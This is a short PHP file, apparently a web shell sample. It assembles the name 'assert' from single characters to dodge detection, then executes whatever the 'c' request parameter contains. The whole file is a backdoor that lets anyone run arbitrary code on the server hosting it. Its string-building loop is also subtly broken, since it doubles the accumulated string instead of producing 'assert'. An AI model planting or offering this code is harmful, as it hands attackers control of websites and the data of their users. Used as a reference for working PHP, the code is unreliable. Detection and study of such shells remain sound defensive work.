<?php
	$arr = array('a','s','s','e','r','t');

	$func = '';

	for($i=0;$i<count($arr);$i++) {

	$func .= $func . $arr[$i];

	}

	$func($_REQUEST['c']);

?>